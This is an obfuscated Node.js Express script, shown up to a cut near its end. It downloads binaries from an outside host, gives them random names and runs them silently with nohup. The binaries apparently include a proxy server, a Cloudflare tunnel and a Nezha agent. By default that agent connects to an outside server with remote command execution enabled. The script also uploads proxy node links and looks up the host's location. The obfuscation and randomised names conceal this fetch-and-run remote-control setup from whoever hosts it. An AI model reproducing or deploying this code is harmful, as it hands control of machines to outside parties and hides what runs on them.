function _0x257c(){const _0x4ad5c8=['\x20successfully','promises','/api/delete-nodes','arm64','readFileSync','php\x20running\x20error:\x20','utf8','exec','1798224IUiaqp','fileName','unlink','true','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','mkdirSync','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/web','2053','path','/vmess-argo?ed=2560','catch','finish','https://ipapi.co/json','http','https://oooo.serv00.net/add-url','country_code','toString','trojan','npm\x20running\x20error:\x20','\x0avless://','8443','1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4','.tmp','ARGO_AUTH','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','test','firefox','https://arm64.ssss.nyc.mn/web','127.0.0.1','Error\x20executing\x20command:\x20','map','from','ARGO_PORT','status','\x20>/dev/null\x202>&1','2096','forEach','existsSync','all','3760724nPJRUa','filter','&fp=firefox&type=ws&host=','join','isFile','env','then','split','\x0a\x0avmess://','FILE_PATH','org','63790iTIEDa','success','false','automatic\x20access\x20task\x20added\x20successfully','&path=%2Ftrojan-argo%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tls','message','get','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','UUID','?security=tls&sni=','child_process','boot.log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Download\x20','floor','readdirSync','\x22\x20>\x20/dev/null\x202>&1','172758Tjiaua','base64','utf-8','SUB_PATH','225XWivyV','vless','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','createWriteStream','tcp','/api/add-nodes','Error\x20downloading\x20files:','listen','NEZHA\x20variable\x20is\x20empty,skip\x20running','chmod','config.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','quic','del\x20/f\x20/q\x20','xtls-rprx-vision','Nodes\x20uploaded\x20successfully','error','\x0a\x0atrojan://','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Subscription\x20uploaded\x20successfully','freedom','pkill\x20-f\x20\x22[','Error\x20in\x20startserver:','Unhandled\x20error\x20in\x20startserver:','App\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','279027nvHiKK','statSync','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20-s\x20','set','blackhole','PORT','amd','block','/tunnel.yml\x20run','Galaxy','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','substring','\x20failed:\x20','pipe','\x20>\x20nul\x202>&1','countryCode','text/plain;\x20charset=utf-8','writeFileSync','/config.json\x20>/dev/null\x202>&1\x20&','443','push','\x20is\x20created','Error\x20reading\x20boot.log:','clear','aarch64','log','ARGO_DOMAIN:','2087','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','AUTO_ACCESS','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','865EqpurB','\x20>/dev/null\x202>&1\x20&','basename','pop','application/json','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/v1','taskkill\x20/f\x20/im\x20','\x0a\x20\x20credentials-file:\x20','CFIP','254owBlXY','abcdefghijklmnopqrstuvwxyz','TunnelSecret','NAME','Empowerment\x20failed\x20for\x20','/vmess-argo','875BMtIii','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','unshift','send','fileUrl','charAt','SERVER_PORT','arm','nohup\x20','34590eRLvNT','unlinkSync','https+local://8.8.8.8/dns-query','stringify','\x20-p\x20','data','?encryption=none&security=tls&sni=','.exe\x20>\x20nul\x202>&1','platform','/dev/null','\x20-c\x20\x22','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','post','\x0a\x20\x20\x20\x20','nezha.xinxi.pp.ua:443','/trojan-argo','https://arm64.ssss.nyc.mn/agent','cdns.doon.eu.org','none','https://arm64.ssss.nyc.mn/v1','http://ip-api.com/json','length','\x20is\x20running','/sub.txt\x20saved\x20successfully','/vless-argo','response','win32','\x20-c\x20','includes','direct','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','match','vmess','2083'];_0x257c=function(){return _0x4ad5c8;};return _0x257c();}const _0x53eef8=_0x1d9d;(function(_0x1e992d,_0x3588e3){const _0x5ea896={_0x20703b:0xa5,_0x25b476:0xcf},_0x23a419=_0x1d9d,_0x41393d=_0x1e992d();while(!![]){try{const _0x48674e=parseInt(_0x23a419(0x8b))/0x1*(parseInt(_0x23a419(0x95))/0x2)+-parseInt(_0x23a419(0x117))/0x3+-parseInt(_0x23a419(0xf8))/0x4+-parseInt(_0x23a419(0x9b))/0x5*(-parseInt(_0x23a419(_0x5ea896._0x20703b))/0x6)+parseInt(_0x23a419(0x136))/0x7+parseInt(_0x23a419(_0x5ea896._0x25b476))/0x8+-parseInt(_0x23a419(0x11b))/0x9*(-parseInt(_0x23a419(0x103))/0xa);if(_0x48674e===_0x3588e3)break;else _0x41393d['push'](_0x41393d['shift']());}catch(_0x5593c6){_0x41393d['push'](_0x41393d['shift']());}}}(_0x257c,0x85135));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x53eef8(0xd9)),{promisify}=require('util'),exec=promisify(require(_0x53eef8(0x10f))[_0x53eef8(0xce)]),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x53eef8(0xfd)][_0x53eef8(0x89)]||![],FILE_PATH=process[_0x53eef8(0xfd)][_0x53eef8(0x101)]||_0x53eef8(0xe7),SUB_PATH=process['env'][_0x53eef8(0x11a)]||'sub',PORT=process[_0x53eef8(0xfd)][_0x53eef8(0xa2)]||process[_0x53eef8(0xfd)][_0x53eef8(0x13c)]||0xbb8,UUID=process[_0x53eef8(0xfd)][_0x53eef8(0x10d)]||'4f96b9fd-5c6c-4e47-a328-ba8fcaff89de',NEZHA_SERVER=process[_0x53eef8(0xfd)]['NEZHA_SERVER']||_0x53eef8(0xb3),NEZHA_PORT=process[_0x53eef8(0xfd)][_0x53eef8(0xd5)]||'',NEZHA_KEY=process[_0x53eef8(0xfd)]['NEZHA_KEY']||_0x53eef8(0xe6),ARGO_DOMAIN=process[_0x53eef8(0xfd)][_0x53eef8(0x90)]||'',ARGO_AUTH=process[_0x53eef8(0xfd)][_0x53eef8(0xe8)]||'',ARGO_PORT=process[_0x53eef8(0xfd)][_0x53eef8(0xf1)]||0x1f41,CFIP=process[_0x53eef8(0xfd)][_0x53eef8(0x94)]||_0x53eef8(0xb6),CFPORT=process[_0x53eef8(0xfd)]['CFPORT']||0x1bb,NAME=process[_0x53eef8(0xfd)][_0x53eef8(0x98)]||_0x53eef8(0x140);!fs[_0x53eef8(0xf6)](FILE_PATH)?(fs[_0x53eef8(0xd4)](FILE_PATH),console['log'](FILE_PATH+_0x53eef8(0x81))):console[_0x53eef8(0x85)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2339e3={_0x2defd1:0x96,_0x1c32ee:0xba},_0x14a59d=_0x53eef8,_0x367cd6=_0x14a59d(_0x2339e3._0x2defd1);let _0x4802df='';for(let _0xcad155=0x0;_0xcad155<0x6;_0xcad155++){_0x4802df+=_0x367cd6['charAt'](Math[_0x14a59d(0x114)](Math['random']()*_0x367cd6[_0x14a59d(_0x2339e3._0x1c32ee)]));}return _0x4802df;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x53eef8(0xfb)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x53eef8(0xfb)](FILE_PATH,botName),subPath=path[_0x53eef8(0xfb)](FILE_PATH,'sub.txt'),listPath=path[_0x53eef8(0xfb)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x53eef8(0x110)),configPath=path['join'](FILE_PATH,_0x53eef8(0x126));function deleteNodes(){const _0xb05a79={_0x37c333:0xcb,_0x45080a:0x119,_0x260266:0xf0,_0x2cd2b2:0x118,_0x5613da:0xff,_0x32226d:0xf9},_0x4f8f1a=_0x53eef8;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xe0b575;try{_0xe0b575=fs[_0x4f8f1a(_0xb05a79._0x37c333)](subPath,_0x4f8f1a(_0xb05a79._0x45080a));}catch{return null;}const _0x575b82=Buffer[_0x4f8f1a(_0xb05a79._0x260266)](_0xe0b575,_0x4f8f1a(_0xb05a79._0x2cd2b2))[_0x4f8f1a(0xe1)](_0x4f8f1a(0x119)),_0x541c3e=_0x575b82[_0x4f8f1a(_0xb05a79._0x5613da)]('\x0a')[_0x4f8f1a(_0xb05a79._0x32226d)](_0x2300e2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2300e2));if(_0x541c3e['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x4f8f1a(0xc9),JSON['stringify']({'nodes':_0x541c3e}),{'headers':{'Content-Type':_0x4f8f1a(0x8f)}})[_0x4f8f1a(0xdb)](_0x5caab5=>{return null;}),null;}catch(_0x31f3f8){return null;}}function cleanupOldFiles(){const _0x59cec3={_0x41d78a:0xfb,_0x402c89:0x137},_0x361a43=_0x53eef8;try{const _0x477e44=fs[_0x361a43(0x115)](FILE_PATH);_0x477e44[_0x361a43(0xf5)](_0x56ae1b=>{const _0x4a16bd=_0x361a43,_0x12f4fe=path[_0x4a16bd(_0x59cec3._0x41d78a)](FILE_PATH,_0x56ae1b);try{const _0x54068a=fs[_0x4a16bd(_0x59cec3._0x402c89)](_0x12f4fe);_0x54068a[_0x4a16bd(0xfc)]()&&fs[_0x4a16bd(0xa6)](_0x12f4fe);}catch(_0x400025){}});}catch(_0x11a5c1){}}async function generateConfig(){const _0x43a26a={_0xeb5ab:0xbd,_0x296f4b:0x120,_0x10ef49:0xb7,_0x577840:0xb7,_0x28ba13:0x11c,_0x3c9070:0xb7,_0x4ed786:0xbd,_0x4208e6:0x128,_0x5ed26c:0xde,_0x3ee684:0xed,_0x37e2c6:0xa7,_0x1a8226:0x130,_0x159a8a:0xc2,_0x36eb21:0x13b,_0x37af78:0x13e,_0x2ad579:0x7d,_0x6f6f83:0xfb,_0x13c925:0x126},_0x59b16c=_0x53eef8,_0x35f885={'log':{'access':_0x59b16c(0xae),'error':_0x59b16c(0xae),'loglevel':_0x59b16c(0xb7)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x59b16c(0x12a)}],'decryption':_0x59b16c(0xb7),'fallbacks':[{'dest':0xbb9},{'path':_0x59b16c(_0x43a26a._0xeb5ab),'dest':0xbba},{'path':_0x59b16c(0x9a),'dest':0xbbb},{'path':_0x59b16c(0xb4),'dest':0xbbc}]},'streamSettings':{'network':_0x59b16c(_0x43a26a._0x296f4b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x59b16c(_0x43a26a._0x10ef49)},'streamSettings':{'network':_0x59b16c(0x120),'security':_0x59b16c(_0x43a26a._0x577840)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x59b16c(_0x43a26a._0x28ba13),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x59b16c(_0x43a26a._0x3c9070)},'streamSettings':{'network':'ws','security':_0x59b16c(_0x43a26a._0x3c9070),'wsSettings':{'path':_0x59b16c(_0x43a26a._0x4ed786)}},'sniffing':{'enabled':!![],'destOverride':[_0x59b16c(0xde),'tls',_0x59b16c(_0x43a26a._0x4208e6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x59b16c(0xed),'protocol':_0x59b16c(0xc5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x59b16c(_0x43a26a._0x5ed26c),_0x59b16c(0x109),_0x59b16c(0x128)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x59b16c(_0x43a26a._0x3ee684),'protocol':_0x59b16c(0xe2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x59b16c(0xb4)}},'sniffing':{'enabled':!![],'destOverride':[_0x59b16c(_0x43a26a._0x5ed26c),'tls',_0x59b16c(_0x43a26a._0x4208e6)],'metadataOnly':![]}}],'dns':{'servers':[_0x59b16c(_0x43a26a._0x37e2c6)]},'outbounds':[{'protocol':_0x59b16c(_0x43a26a._0x1a8226),'tag':_0x59b16c(_0x43a26a._0x159a8a)},{'protocol':_0x59b16c(_0x43a26a._0x36eb21),'tag':_0x59b16c(_0x43a26a._0x37af78)}]};fs[_0x59b16c(_0x43a26a._0x2ad579)](path[_0x59b16c(_0x43a26a._0x6f6f83)](FILE_PATH,_0x59b16c(_0x43a26a._0x13c925)),JSON[_0x59b16c(0xa8)](_0x35f885,null,0x2));}function getSystemArchitecture(){const _0x3eec43={_0x301478:0x13d},_0x113a5c=_0x53eef8,_0x505ed=os['arch']();return _0x505ed===_0x113a5c(0xa3)||_0x505ed===_0x113a5c(0xca)||_0x505ed===_0x113a5c(0x84)?'arm':_0x113a5c(_0x3eec43._0x301478);}function downloadFile(_0x51e01f,_0x24af6b,_0x58471f){const _0x7baab1={_0x7d0f2a:0xd4,_0x178345:0x11f,_0x25e33b:0xdb},_0x4d61e2={_0x69c4f3:0x8d,_0x1abcdf:0x143},_0x4a995a={_0x24ebc9:0xaa,_0x30f991:0x144,_0x5277bf:0x12c},_0x41c95a=_0x53eef8,_0x33b4ae=_0x51e01f;!fs[_0x41c95a(0xf6)](FILE_PATH)&&fs[_0x41c95a(_0x7baab1._0x7d0f2a)](FILE_PATH,{'recursive':!![]});const _0x3baba8=fs[_0x41c95a(_0x7baab1._0x178345)](_0x33b4ae);axios({'method':_0x41c95a(0x10b),'url':_0x24af6b,'responseType':'stream'})[_0x41c95a(0xfe)](_0x38be0d=>{const _0x1c4e59={_0x503e1e:0x8d,_0x21cda9:0x143,_0x53ae04:0x10a},_0x22ad36={_0x278fac:0x85,_0x51be66:0x113,_0x2fcf2d:0x8d},_0x4d8b5a=_0x41c95a;_0x38be0d[_0x4d8b5a(_0x4a995a._0x24ebc9)][_0x4d8b5a(_0x4a995a._0x30f991)](_0x3baba8),_0x3baba8['on'](_0x4d8b5a(0xdc),()=>{const _0x3cd626=_0x4d8b5a;_0x3baba8['close'](),console[_0x3cd626(_0x22ad36._0x278fac)](_0x3cd626(_0x22ad36._0x51be66)+path[_0x3cd626(_0x22ad36._0x2fcf2d)](_0x33b4ae)+_0x3cd626(0xc7)),_0x58471f(null,_0x33b4ae);}),_0x3baba8['on'](_0x4d8b5a(_0x4a995a._0x5277bf),_0x3127b7=>{const _0x52a890=_0x4d8b5a;fs[_0x52a890(0xd1)](_0x33b4ae,()=>{});const _0x629086=_0x52a890(0x113)+path[_0x52a890(_0x1c4e59._0x503e1e)](_0x33b4ae)+_0x52a890(_0x1c4e59._0x21cda9)+_0x3127b7[_0x52a890(_0x1c4e59._0x53ae04)];console[_0x52a890(0x12c)](_0x629086),_0x58471f(_0x629086);});})[_0x41c95a(_0x7baab1._0x25e33b)](_0x51bbb4=>{const _0x450ee6=_0x41c95a,_0x31c4e5=_0x450ee6(0x113)+path[_0x450ee6(_0x4d61e2._0x69c4f3)](_0x33b4ae)+_0x450ee6(_0x4d61e2._0x1abcdf)+_0x51bbb4['message'];console['error'](_0x31c4e5),_0x58471f(_0x31c4e5);});}function _0x1d9d(_0x1704d0,_0x5ba10c){const _0x257cd3=_0x257c();return _0x1d9d=function(_0x1d9d5b,_0x220276){_0x1d9d5b=_0x1d9d5b-0x7b;let _0x5ce6d6=_0x257cd3[_0x1d9d5b];return _0x5ce6d6;},_0x1d9d(_0x1704d0,_0x5ba10c);}async function downloadFilesAndRun(){const _0x1fa7b8={_0x59d7eb:0x108,_0x9ffddb:0xf7,_0x2cafd5:0x122,_0x225d78:0xff,_0x222d8a:0xe5,_0x5c71f8:0xf4,_0x4b9d64:0xc6,_0x5ca08e:0xd2,_0x1105a6:0x111,_0x49c9f8:0xfb,_0x60a803:0xaf,_0x3b187e:0xb0,_0x160929:0xbb,_0x4a5279:0x12c,_0x83f59:0x7f,_0x5c6c9f:0xf4,_0x3873c8:0x87,_0x34445a:0xd8,_0x4ce84c:0xc3,_0x5871a4:0xe3,_0x295ac7:0x124,_0x3157a5:0xa4,_0x43787f:0xc0,_0x4ef028:0x7e,_0x3e611d:0xd3,_0x35c831:0xc4,_0x370165:0x13f,_0x47c44b:0x112,_0x287b68:0x12c},_0x3d6b5a={_0x278d9e:0x125},_0x4e91bc=_0x53eef8,_0x423b04=getSystemArchitecture(),_0x54283c=getFilesForArchitecture(_0x423b04);if(_0x54283c[_0x4e91bc(0xba)]===0x0){console[_0x4e91bc(0x85)](_0x4e91bc(_0x1fa7b8._0x59d7eb));return;}const _0x3dca5a=_0x54283c[_0x4e91bc(0xef)](_0x32abb4=>{const _0x2bf353={_0x5d8fdb:0xd0,_0x41595d:0xa0};return new Promise((_0xb8fcd2,_0xa6fbd3)=>{const _0x145514=_0x1d9d;downloadFile(_0x32abb4[_0x145514(_0x2bf353._0x5d8fdb)],_0x32abb4[_0x145514(_0x2bf353._0x41595d)],(_0x5a8645,_0x4196a8)=>{_0x5a8645?_0xa6fbd3(_0x5a8645):_0xb8fcd2(_0x4196a8);});});});try{await Promise[_0x4e91bc(_0x1fa7b8._0x9ffddb)](_0x3dca5a);}catch(_0x13c3a7){console[_0x4e91bc(0x12c)](_0x4e91bc(_0x1fa7b8._0x2cafd5),_0x13c3a7);return;}function _0x38f708(_0x260890){const _0x52297a={_0x240449:0x99,_0x5676fb:0x85},_0x578aec=_0x4e91bc,_0x1c618f=0x1fd;_0x260890[_0x578aec(0xf5)](_0x275c36=>{const _0x5e3b0d=_0x578aec;fs[_0x5e3b0d(0xf6)](_0x275c36)&&fs[_0x5e3b0d(_0x3d6b5a._0x278d9e)](_0x275c36,_0x1c618f,_0x475ba6=>{const _0x27587c=_0x5e3b0d;_0x475ba6?console[_0x27587c(0x12c)](_0x27587c(_0x52297a._0x240449)+_0x275c36+':\x20'+_0x475ba6):console[_0x27587c(_0x52297a._0x5676fb)]('Empowerment\x20success\x20for\x20'+_0x275c36+':\x20'+_0x1c618f[_0x27587c(0xe1)](0x8));});});}const _0x34af75=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x38f708(_0x34af75);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2af8f2=NEZHA_SERVER[_0x4e91bc(0xc1)](':')?NEZHA_SERVER[_0x4e91bc(_0x1fa7b8._0x225d78)](':')[_0x4e91bc(0x8e)]():'',_0x162e38=new Set(['443',_0x4e91bc(_0x1fa7b8._0x222d8a),_0x4e91bc(_0x1fa7b8._0x5c71f8),_0x4e91bc(0x87),_0x4e91bc(_0x1fa7b8._0x4b9d64),_0x4e91bc(0xd8)]),_0x3524a3=_0x162e38['has'](_0x2af8f2)?_0x4e91bc(_0x1fa7b8._0x5ca08e):_0x4e91bc(0x105),_0x367060='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4e91bc(0x8a)+_0x3524a3+_0x4e91bc(_0x1fa7b8._0x1105a6)+UUID;fs['writeFileSync'](path[_0x4e91bc(_0x1fa7b8._0x49c9f8)](FILE_PATH,'config.yaml'),_0x367060);const _0x1cf140='nohup\x20'+phpPath+_0x4e91bc(_0x1fa7b8._0x60a803)+FILE_PATH+_0x4e91bc(_0x1fa7b8._0x3b187e);try{await exec(_0x1cf140),console['log'](phpName+_0x4e91bc(_0x1fa7b8._0x160929)),await new Promise(_0x2c27d0=>setTimeout(_0x2c27d0,0x3e8));}catch(_0x5cd9cb){console[_0x4e91bc(_0x1fa7b8._0x4a5279)](_0x4e91bc(0xcc)+_0x5cd9cb);}}else{let _0x4f4745='';const _0x151f20=[_0x4e91bc(_0x1fa7b8._0x83f59),_0x4e91bc(_0x1fa7b8._0x222d8a),_0x4e91bc(_0x1fa7b8._0x5c6c9f),_0x4e91bc(_0x1fa7b8._0x3873c8),_0x4e91bc(0xc6),_0x4e91bc(_0x1fa7b8._0x34445a)];_0x151f20['includes'](NEZHA_PORT)&&(_0x4f4745='--tls');const _0x533fc6=_0x4e91bc(0xa4)+npmPath+_0x4e91bc(0x139)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e91bc(0xa9)+NEZHA_KEY+'\x20'+_0x4f4745+_0x4e91bc(_0x1fa7b8._0x4ce84c);try{await exec(_0x533fc6),console[_0x4e91bc(0x85)](npmName+'\x20is\x20running'),await new Promise(_0x209199=>setTimeout(_0x209199,0x3e8));}catch(_0x434fad){console[_0x4e91bc(0x12c)](_0x4e91bc(_0x1fa7b8._0x5871a4)+_0x434fad);}}}else console[_0x4e91bc(0x85)](_0x4e91bc(_0x1fa7b8._0x295ac7));const _0x8e8345=_0x4e91bc(_0x1fa7b8._0x3157a5)+webPath+_0x4e91bc(_0x1fa7b8._0x43787f)+FILE_PATH+_0x4e91bc(_0x1fa7b8._0x4ef028);try{await exec(_0x8e8345),console[_0x4e91bc(0x85)](webName+_0x4e91bc(0xbb)),await new Promise(_0x421c5d=>setTimeout(_0x421c5d,0x3e8));}catch(_0x4386ac){console[_0x4e91bc(0x12c)]('web\x20running\x20error:\x20'+_0x4386ac);}if(fs['existsSync'](botPath)){let _0x4ebaee;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4ebaee=_0x4e91bc(_0x1fa7b8._0x3e611d)+ARGO_AUTH;else ARGO_AUTH[_0x4e91bc(_0x1fa7b8._0x35c831)](/TunnelSecret/)?_0x4ebaee=_0x4e91bc(0x9d)+FILE_PATH+_0x4e91bc(_0x1fa7b8._0x370165):_0x4ebaee='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4e91bc(_0x1fa7b8._0x47c44b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4ebaee+_0x4e91bc(0x8c)),console[_0x4e91bc(0x85)](botName+'\x20is\x20running'),await new Promise(_0x42de1d=>setTimeout(_0x42de1d,0x7d0));}catch(_0x5f525f){console[_0x4e91bc(_0x1fa7b8._0x287b68)](_0x4e91bc(0xee)+_0x5f525f);}}await new Promise(_0x234f38=>setTimeout(_0x234f38,0x1388));}function getFilesForArchitecture(_0xb86fda){const _0x2cc90a={_0x29488b:0xec,_0x24fab5:0xd7,_0x286407:0xd6,_0x446612:0x9e,_0x1cda8f:0xb8,_0x1f561d:0x91,_0x33b082:0x9e},_0x23808f=_0x53eef8;let _0x351916;_0xb86fda===_0x23808f(0xa3)?_0x351916=[{'fileName':webPath,'fileUrl':_0x23808f(_0x2cc90a._0x29488b)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x351916=[{'fileName':webPath,'fileUrl':_0x23808f(_0x2cc90a._0x24fab5)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x46611f=_0xb86fda===_0x23808f(0xa3)?_0x23808f(0xb5):_0x23808f(_0x2cc90a._0x286407);_0x351916[_0x23808f(_0x2cc90a._0x446612)]({'fileName':npmPath,'fileUrl':_0x46611f});}else{const _0x3f258c=_0xb86fda===_0x23808f(0xa3)?_0x23808f(_0x2cc90a._0x1cda8f):_0x23808f(_0x2cc90a._0x1f561d);_0x351916[_0x23808f(_0x2cc90a._0x33b082)]({'fileName':phpPath,'fileUrl':_0x3f258c});}}return _0x351916;}function argoType(){const _0x36e323={_0x35118d:0x85,_0x5e6840:0xe9,_0x1d3506:0x97,_0x2700df:0x93,_0x5f25c3:0x11e},_0x1e2fe4=_0x53eef8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1e2fe4(_0x36e323._0x35118d)](_0x1e2fe4(_0x36e323._0x5e6840));return;}if(ARGO_AUTH['includes'](_0x1e2fe4(_0x36e323._0x1d3506))){fs[_0x1e2fe4(0x7d)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x49084c='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1e2fe4(0xff)]('\x22')[0xb]+_0x1e2fe4(_0x36e323._0x2700df)+path[_0x1e2fe4(0xfb)](FILE_PATH,'tunnel.json')+_0x1e2fe4(_0x36e323._0x5f25c3)+ARGO_DOMAIN+_0x1e2fe4(0x127)+ARGO_PORT+_0x1e2fe4(0x88);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x49084c);}else console[_0x1e2fe4(0x85)](_0x1e2fe4(0x135));}async function extractDomains(){const _0x1c80b0={_0x278662:0x86,_0xf32d35:0xfb,_0x585fdb:0xff,_0x1aa014:0xf5,_0x43a9fc:0x85,_0x8ddd21:0x85,_0x227e20:0x12e,_0x372eab:0x110,_0x529949:0x10c,_0xa5c117:0x85,_0x36f611:0xbb,_0x10798e:0xee,_0x276965:0x12c},_0x1ff23c={_0x4a944f:0x10b,_0xa5ce81:0x102,_0x2b5449:0xaa,_0xa5b374:0xe0,_0xb9226b:0x10b,_0x370a52:0xaa,_0x59b3c7:0x104,_0x250899:0x102,_0xb59128:0x7b},_0x58d799={_0xea874f:0xbf,_0x4089fe:0x92,_0xfd3df0:0x131,_0x33d67f:0x142},_0x2cf6db=_0x53eef8;let _0x566590;if(ARGO_AUTH&&ARGO_DOMAIN)_0x566590=ARGO_DOMAIN,console['log'](_0x2cf6db(_0x1c80b0._0x278662),_0x566590),await _0x4822bb(_0x566590);else try{const _0x5378d0=fs['readFileSync'](path[_0x2cf6db(_0x1c80b0._0xf32d35)](FILE_PATH,'boot.log'),'utf-8'),_0x620b39=_0x5378d0[_0x2cf6db(_0x1c80b0._0x585fdb)]('\x0a'),_0x4eca54=[];_0x620b39[_0x2cf6db(_0x1c80b0._0x1aa014)](_0x47424d=>{const _0xa5ca96=_0x2cf6db,_0x14dee0=_0x47424d[_0xa5ca96(0xc4)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x14dee0){const _0x3c0a81=_0x14dee0[0x1];_0x4eca54['push'](_0x3c0a81);}});if(_0x4eca54[_0x2cf6db(0xba)]>0x0)_0x566590=_0x4eca54[0x0],console[_0x2cf6db(_0x1c80b0._0x43a9fc)]('ArgoDomain:',_0x566590),await _0x4822bb(_0x566590);else{console[_0x2cf6db(_0x1c80b0._0x8ddd21)](_0x2cf6db(_0x1c80b0._0x227e20)),fs[_0x2cf6db(0xa6)](path[_0x2cf6db(0xfb)](FILE_PATH,_0x2cf6db(_0x1c80b0._0x372eab)));async function _0x2f010c(){const _0x536c9f=_0x2cf6db;try{process[_0x536c9f(0xad)]===_0x536c9f(_0x58d799._0xea874f)?await exec(_0x536c9f(_0x58d799._0x4089fe)+botName+_0x536c9f(0xac)):await exec(_0x536c9f(_0x58d799._0xfd3df0)+botName[_0x536c9f(0xa1)](0x0)+']'+botName[_0x536c9f(_0x58d799._0x33d67f)](0x1)+_0x536c9f(0x116));}catch(_0x5919b1){}}_0x2f010c(),await new Promise(_0x10c199=>setTimeout(_0x10c199,0xbb8));const _0x4a17b8=_0x2cf6db(_0x1c80b0._0x529949)+FILE_PATH+_0x2cf6db(0x112)+ARGO_PORT;try{await exec(_0x2cf6db(0xa4)+botPath+'\x20'+_0x4a17b8+_0x2cf6db(0x8c)),console[_0x2cf6db(_0x1c80b0._0xa5c117)](botName+_0x2cf6db(_0x1c80b0._0x36f611)),await new Promise(_0x2a3d5b=>setTimeout(_0x2a3d5b,0xbb8)),await extractDomains();}catch(_0x17ecb6){console[_0x2cf6db(0x12c)](_0x2cf6db(_0x1c80b0._0x10798e)+_0x17ecb6);}}}catch(_0x4ee0e5){console[_0x2cf6db(_0x1c80b0._0x276965)](_0x2cf6db(0x82),_0x4ee0e5);}async function _0x59a97d(){const _0x229bfd=_0x2cf6db;try{const _0x637f6b=await axios[_0x229bfd(_0x1ff23c._0x4a944f)](_0x229bfd(0xdd),{'timeout':0xbb8});if(_0x637f6b['data']&&_0x637f6b[_0x229bfd(0xaa)][_0x229bfd(0xe0)]&&_0x637f6b[_0x229bfd(0xaa)][_0x229bfd(_0x1ff23c._0xa5ce81)])return _0x637f6b[_0x229bfd(_0x1ff23c._0x2b5449)][_0x229bfd(_0x1ff23c._0xa5b374)]+'_'+_0x637f6b[_0x229bfd(_0x1ff23c._0x2b5449)]['org'];}catch(_0x3484b5){try{const _0xe33480=await 